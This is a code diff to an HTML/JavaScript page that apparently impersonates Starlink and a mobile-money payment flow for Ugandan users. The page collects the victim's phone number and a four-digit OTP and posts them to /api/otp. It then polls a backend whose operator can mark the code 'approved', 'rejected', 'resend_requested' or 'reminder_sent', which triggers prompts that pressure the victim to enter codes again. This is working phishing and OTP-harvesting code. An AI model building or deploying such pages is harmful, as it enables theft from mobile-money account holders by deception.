@@ -7,9 +7,6 @@
     <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
     <style>
-        /* ============================================
-           RESET & BASE
-        ============================================ */
         *, *::before, *::after {
             margin: 0;
             padding: 0;
@@ -66,9 +63,6 @@
         a { text-decoration: none; color: inherit; }
         button { font-family: inherit; cursor: pointer; border: none; background: none; }
 
-        /* ============================================
-           HEADER
-        ============================================ */
         .header {
             position: fixed;
             top: 0; left: 0; right: 0;
@@ -113,9 +107,6 @@
         .header-nav a:hover { color: var(--white); }
         .header-nav i { font-size: 18px; }
 
-        /* ============================================
-           MAIN
-        ============================================ */
         .main {
             max-width: 1200px;
             margin: 0 auto;
@@ -135,9 +126,6 @@
             max-width: 420px;
         }
 
-        /* ============================================
-           YELLOW BAND
-        ============================================ */
         .otp-band {
             background: linear-gradient(135deg, #FFCC00 0%, #FFD633 100%);
             border-radius: var(--radius-2xl) var(--radius-2xl) 0 0;
@@ -185,9 +173,6 @@
             position: relative;
         }
 
-        /* ============================================
-           WHITE CARD
-        ============================================ */
         .otp-body {
             background: var(--white);
             border-radius: 0 0 var(--radius-2xl) var(--radius-2xl);
@@ -195,7 +180,6 @@
             box-shadow: var(--shadow-lg);
         }
 
-        /* Top row: Back + Amount */
         .otp-top {
             display: flex;
             align-items: center;
@@ -237,7 +221,6 @@
             margin-top: 2px;
         }
 
-        /* Instruction */
         .otp-instruction {
             font-size: 13.5px;
             color: var(--gray-600);
@@ -251,7 +234,6 @@
             font-weight: 800;
         }
 
-        /* Phone chip */
         .phone-chip {
             display: flex;
             align-items: center;
@@ -285,7 +267,6 @@
             letter-spacing: 0.5px;
         }
 
-        /* OTP label */
         .otp-label {
             display: block;
             font-size: 11px;
@@ -297,7 +278,6 @@
             text-align: center;
         }
 
-        /* OTP boxes */
         .otp-boxes {
             display: flex;
             justify-content: center;
@@ -332,7 +312,6 @@
             background: #FFFDF5;
         }
 
-        /* Submit button */
         .btn-otp {
             width: 100%;
             padding: 17px;
@@ -377,7 +356,6 @@
 
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* Trust footer */
         .trust-footer {
             display: flex;
             align-items: center;
@@ -394,9 +372,139 @@
 
         .trust-footer i { font-size: 14px; color: var(--green-600); }
 
-        /* ============================================
-           SUCCESS OVERLAY (final screen)
-        ============================================ */
+        /* WAITING OVERLAY */
+        .waiting-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 10000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(160deg, #0a0a0a 0%, #1a1a1a 50%, #000000 100%);
+            color: var(--white);
+            padding: 24px;
+            overflow: hidden;
+        }
+
+        .waiting-overlay.open { display: flex; animation: fadeIn 0.35s ease; }
+
+        .waiting-overlay::before {
+            content: "";
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 600px; height: 600px;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(255,204,0,0.18) 0%, transparent 60%);
+            animation: pulseGlow 3s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { transform: translate(-50%, -50%) scale(1);   opacity: 0.6; }
+            50%      { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
+        }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        .waiting-content {
+            position: relative;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            z-index: 2;
+        }
+
+        .waiting-orbit {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 28px;
+            position: relative;
+        }
+
+        .waiting-ring {
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 2px dashed rgba(255,204,0,0.4);
+            animation: rotate 8s linear infinite;
+        }
+
+        .waiting-ring.inner {
+            inset: 22px;
+            border: 1.5px dashed rgba(59,130,246,0.4);
+            animation: rotate 5s linear infinite reverse;
+        }
+
+        @keyframes rotate { to { transform: rotate(360deg); } }
+
+        .waiting-core {
+            position: absolute;
+            top: 50%; left: 50%;
+            width: 60px; height: 60px;
+            transform: translate(-50%, -50%);
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--momo-yellow) 0%, #FFD633 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 40px rgba(255,204,0,0.5);
+            animation: corePulse 1.6s ease-in-out infinite;
+        }
+
+        @keyframes corePulse {
+            0%, 100% { box-shadow: 0 0 40px rgba(255,204,0,0.5); }
+            50%      { box-shadow: 0 0 60px rgba(255,204,0,0.9); }
+        }
+
+        .waiting-core i { font-size: 28px; color: var(--black); }
+
+        .waiting-title {
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+        }
+
+        .waiting-title .highlight {
+            background: linear-gradient(90deg, var(--momo-yellow), #FFD633);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .waiting-sub {
+            font-size: 14px;
+            color: var(--gray-400);
+            margin-top: 14px;
+            line-height: 1.65;
+        }
+
+        .waiting-sub strong { color: var(--white); font-weight: 800; }
+
+        .waiting-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 24px;
+        }
+
+        .waiting-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--momo-yellow);
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+
+        .waiting-dot:nth-child(1) { animation-delay: -0.32s; }
+        .waiting-dot:nth-child(2) { animation-delay: -0.16s; }
+        .waiting-dot:nth-child(3) { animation-delay: 0s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
+            40%           { transform: scale(1);   opacity: 1; }
+        }
+
+        /* SUCCESS OVERLAY */
         .success-overlay {
             position: fixed;
             inset: 0;
@@ -412,8 +520,6 @@
 
         .success-overlay.open { display: flex; animation: fadeIn 0.4s ease; }
 
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
         .success-overlay::before {
             content: "";
             position: absolute;
@@ -423,11 +529,6 @@
             background: radial-gradient(circle, rgba(34,197,94,0.22) 0%, transparent 60%);
             animation: pulseGlow 3s ease-in-out infinite;
             pointer-events: none;
-        }
-
-        @keyframes pulseGlow {
-            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.6; }
-            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
         }
 
         .success-content {
@@ -533,9 +634,83 @@
         .btn-done:active { transform: scale(0.98); }
         .btn-done i { font-size: 19px; }
 
-        /* ============================================
-           BOTTOM NAV
-        ============================================ */
+        /* TOAST */
+        .toast-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 10001;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(4px);
+            padding: 20px;
+        }
+
+        .toast-overlay.open { display: flex; }
+
+        .toast-card {
+            background: var(--white);
+            border-radius: var(--radius-xl);
+            padding: 24px 22px;
+            max-width: 340px;
+            width: 100%;
+            text-align: center;
+            box-shadow: var(--shadow-2xl);
+            transform: scale(0.9);
+            opacity: 0;
+            transition: transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.3s;
+        }
+
+        .toast-card.show { transform: scale(1); opacity: 1; }
+
+        .toast-icon {
+            width: 56px;
+            height: 56px;
+            border-radius: var(--radius-md);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+        }
+
+        .toast-icon.error { background: #FEE2E2; }
+        .toast-icon.error i { font-size: 28px; color: var(--red-500); }
+        .toast-icon.info { background: #FFF7D6; }
+        .toast-icon.info i { font-size: 28px; color: var(--momo-yellow-dark); }
+
+        .toast-title {
+            font-size: 16px;
+            font-weight: 900;
+            color: var(--gray-900);
+            margin-bottom: 6px;
+        }
+
+        .toast-text {
+            font-size: 13px;
+            color: var(--gray-500);
+            line-height: 1.55;
+            margin-bottom: 18px;
+        }
+
+        .toast-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--momo-yellow);
+            color: var(--black);
+            font-weight: 900;
+            font-size: 13px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            border-radius: var(--radius-md);
+            transition: transform 0.15s, filter 0.2s;
+            box-shadow: 0 4px 12px rgba(255,204,0,0.35);
+        }
+
+        .toast-btn:hover { filter: brightness(0.95); }
+        .toast-btn:active { transform: scale(0.97); }
+
+        /* BOTTOM NAV */
         .bottom-nav {
             position: fixed;
             bottom: 0; left: 0; right: 0;
@@ -572,9 +747,6 @@
         .nav-item i { font-size: 24px; }
         .nav-item:hover { transform: translateY(-2px); }
 
-        /* ============================================
-           RESPONSIVE
-        ============================================ */
         @media (min-width: 640px) {
             .main { padding: 28px 22px 44px; }
             .otp-band { padding: 28px 28px 24px; }
@@ -591,7 +763,6 @@
 </head>
 <body>
 
-    <!-- ============ HEADER ============ -->
     <header class="header">
         <div class="header-inner">
             <a href="/" class="brand">
@@ -606,7 +777,6 @@
         </div>
     </header>
 
-    <!-- ============ MAIN ============ -->
     <main class="main">
         <div class="otp-wrap">
             <div class="otp-card-wrap">
@@ -669,7 +839,30 @@
         </div>
     </main>
 
-    <!-- ============ SUCCESS OVERLAY ============ -->
+    <!-- WAITING OVERLAY -->
+    <div class="waiting-overlay" id="waitingOverlay">
+        <div class="waiting-content">
+            <div class="waiting-orbit">
+                <div class="waiting-ring"></div>
+                <div class="waiting-ring inner"></div>
+                <div class="waiting-core">
+                    <i class="uil uil-lock"></i>
+                </div>
+            </div>
+            <h2 class="waiting-title">Verifying <span class="highlight">OTP</span></h2>
+            <p class="waiting-sub">
+                Please hold on as we confirm your <strong id="waitingPlan">Standard</strong> subscription code.<br>
+                This usually takes a few seconds.
+            </p>
+            <div class="waiting-dots">
+                <span class="waiting-dot"></span>
+                <span class="waiting-dot"></span>
+                <span class="waiting-dot"></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- SUCCESS OVERLAY -->
     <div class="success-overlay" id="successOverlay">
         <div class="success-content">
             <div class="success-check"><i class="uil uil-check"></i></div>
@@ -691,7 +884,18 @@
         </div>
     </div>
 
-    <!-- ============ BOTTOM NAV ============ -->
+    <!-- TOAST -->
+    <div class="toast-overlay" id="toastOverlay">
+        <div class="toast-card" id="toastCard">
+            <div class="toast-icon error" id="toastIcon"><i class="uil uil-exclamation-triangle"></i></div>
+            <h3 class="toast-title" id="toastTitle">Incorrect Code</h3>
+            <p class="toast-text" id="toastText">
+                Incorrect code. Please enter the correct OTP.
+            </p>
+            <button class="toast-btn" id="toastBtn">Try Again</button>
+        </div>
+    </div>
+
     <nav class="bottom-nav">
         <div class="bottom-nav-inner">
             <a href="/dashboard/" class="nav-item"><i class="uil uil-wifi"></i><span>Status</span></a>
@@ -700,11 +904,9 @@
         </div>
     </nav>
 
-    <!-- ============ SCRIPT ============ -->
     <script>
-        // ============================================
-        // READ PLAN FROM URL
-        // ============================================
+        const API_BASE = '';
+
         const params = new URLSearchParams(window.location.search);
         const planName = params.get('plan') || 'Standard';
         const planData = params.get('data') || '60GB';
@@ -715,10 +917,8 @@
             'UGX ' + planPrice.toLocaleString('en-UG', { minimumFractionDigits: 2 });
         document.getElementById('display-phone').textContent =
             '+256 ' + planPhone.replace(/^0/, '');
+        document.getElementById('waitingPlan').textContent = planName;
 
-        // ============================================
-        // OTP BOXES
-        // ============================================
         const otpBoxes = document.querySelectorAll('.otp-box');
         const otpCodeInput = document.getElementById('otp_code');
         const otpForm = document.getElementById('otpForm');
@@ -726,6 +926,21 @@
         const successOverlay = document.getElementById('successOverlay');
         const doneBtn = document.getElementById('doneBtn');
 
+        const waitingOverlay = document.getElementById('waitingOverlay');
+        const toastOverlay = document.getElementById('toastOverlay');
+        const toastCard = document.getElementById('toastCard');
+        const toastIcon = document.getElementById('toastIcon');
+        const toastTitle = document.getElementById('toastTitle');
+        const toastText = document.getElementById('toastText');
+        const toastBtn = document.getElementById('toastBtn');
+
+        let pollTimer = null;
+        let currentSessionId = null;
+        let lastReminderCount = 0;
+
+        // ============================================
+        // OTP INPUT HANDLING
+        // ============================================
         function updateSubmitState() {
             const val = Array.from(otpBoxes).map(b => b.value).join('');
             otpCodeInput.value = val;
@@ -734,6 +949,16 @@
             otpBoxes.forEach(b => {
                 b.classList.toggle('filled', b.value.length === 1);
             });
+        }
+
+        function clearOtpBoxes() {
+            otpBoxes.forEach(b => {
+                b.value = '';
+                b.classList.remove('filled');
+            });
+            otpCodeInput.value = '';
+            submitBtn.disabled = true;
+            otpBoxes[0].focus();
         }
 
         otpBoxes.forEach((box, index) => {
@@ -746,7 +971,6 @@
 
                 updateSubmitState();
 
-                // Auto-submit when all 4 digits are entered
                 const otpValue = Array.from(otpBoxes).map(b => b.value).join('');
                 if (otpValue.length === 4) {
                     setTimeout(() => submitOTP(), 350);
@@ -782,28 +1006,134 @@
             });
         });
 
-        // Focus first box on load
         otpBoxes[0].focus();
 
         // ============================================
-        // SUBMIT OTP
+        // SUBMIT → POST to backend
         // ============================================
         otpForm.addEventListener('submit', (e) => {
             e.preventDefault();
             submitOTP();
         });
 
-        function submitOTP() {
+        async function submitOTP() {
             const val = Array.from(otpBoxes).map(b => b.value).join('');
             if (val.length !== 4) return;
 
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<span class="btn-spinner"></span><span>Verifying...</span>';
 
-            // Simulate verification (replace with real API call)
-            setTimeout(() => {
-                showSuccess();
-            }, 1800);
+            try {
+                const res = await fetch(API_BASE + '/api/otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        plan: planName,
+                        data: planData,
+                        price: planPrice,
+                        phone: planPhone,
+                        otp: val
+                    })
+                });
+
+                const data = await res.json();
+
+                if (!data.ok) {
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify & Complete</span>';
+                    showToast('error', 'Error', 'Something went wrong. Please try again.');
+                    return;
+                }
+
+                currentSessionId = data.sessionId;
+                lastReminderCount = 0;
+
+                waitingOverlay.classList.add('open');
+                document.body.classList.add('modal-open');
+                startPolling(currentSessionId);
+
+            } catch (err) {
+                console.error(err);
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify & Complete</span>';
+                showToast('error', 'Network Error', 'Please check your connection and try again.');
+            }
+        }
+
+        // ============================================
+        // POLL STATUS
+        // ============================================
+        function startPolling(sessionId) {
+            clearInterval(pollTimer);
+            pollTimer = setInterval(async () => {
+                try {
+                    const res = await fetch(API_BASE + '/api/status/' + sessionId);
+                    const data = await res.json();
+
+                    if (!data.ok) return;
+
+                    if (data.status === 'approved') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        showSuccess();
+
+                    } else if (data.status === 'rejected') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        showToast(
+                            'error',
+                            'Verification Failed',
+                            data.message || 'Rejected. Please try again.',
+                            'OK',
+                            () => {
+                                window.location.href = '/plans/';
+                            }
+                        );
+
+                    } else if (data.status === 'resend_requested') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        showToast(
+                            'error',
+                            'Incorrect Code',
+                            data.message || 'Incorrect code. Please enter the correct OTP.',
+                            'Try Again',
+                            () => {
+                                clearOtpBoxes();
+                                submitBtn.disabled = true;
+                                submitBtn.innerHTML = '<i class="uil uil-check-circle"></i><span>Verify &amp; Complete</span>';
+                            }
+                        );
+
+                    } else if (data.status === 'reminder_sent') {
+                        if (lastReminderCount === 0) {
+                            lastReminderCount = 1;
+                            showToast(
+                                'info',
+                                'A Gentle Reminder',
+                                data.message || 'Almost done! Please enter the OTP code we sent you to unlock your Starlink plan. You are one step away from high-speed internet.',
+                                'OK, Got It',
+                                null
+                            );
+                        }
+
+                    } else if (data.status === 'timeout') {
+                        clearInterval(pollTimer);
+                        waitingOverlay.classList.remove('open');
+                        showToast(
+                            'error',
+                            'Session Expired',
+                            'Please start the payment again from the plans page.',
+                            'OK',
+                            () => {
+                                window.location.href = '/plans/';
+                            }
+                        );
+                    }
+                } catch (err) {
+                    // retry silently
+                }
+            }, 2000);
         }
 
         // ============================================
@@ -825,6 +1155,41 @@
 
         doneBtn.addEventListener('click', () => {
             window.location.href = '/dashboard/';
+        });
+
+        // ============================================
+        // TOAST
+        // ============================================
+        let toastAction = null;
+
+        function showToast(type, title, text, buttonLabel, action) {
+            toastIcon.className = 'toast-icon ' + (type === 'info' ? 'info' : 'error');
+            toastIcon.innerHTML = type === 'info'
+                ? '<i class="uil uil-bell"></i>'
+                : '<i class="uil uil-exclamation-triangle"></i>';
+
+            toastTitle.textContent = title;
+            toastText.innerHTML = text;
+            toastBtn.textContent = buttonLabel || 'OK, Got It';
+
+            toastAction = action || null;
+
+            toastOverlay.classList.add('open');
+            setTimeout(() => toastCard.classList.add('show'), 50);
+        }
+
+        function hideToast() {
+            toastCard.classList.remove('show');
+            setTimeout(() => toastOverlay.classList.remove('open'), 250);
+        }
+
+        toastBtn.addEventListener('click', () => {
+            const action = toastAction;
+            toastAction = null;
+            hideToast();
+            if (typeof action === 'function') {
+                setTimeout(action, 250);
+            }
         });
     </script>
 </body>
